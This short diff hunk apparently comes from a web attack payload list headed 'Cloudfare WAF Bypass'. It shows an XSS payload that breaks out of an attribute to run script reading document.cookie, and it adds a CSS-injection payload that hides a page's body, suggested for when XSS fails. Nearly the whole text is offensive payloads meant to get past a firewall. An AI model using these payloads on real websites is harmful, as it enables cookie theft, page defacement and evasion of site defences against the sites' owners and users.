@@ -147,3 +147,8 @@ Cloudfare WAF Bypass
 
 Bero wala payload DOD
 <?foo="><script>javascript:alert(document.cookie)</script>
+
+
+if you can't find a way to get #xss, why not try css payload:
+
+hi"><style>body{display:none}</style>
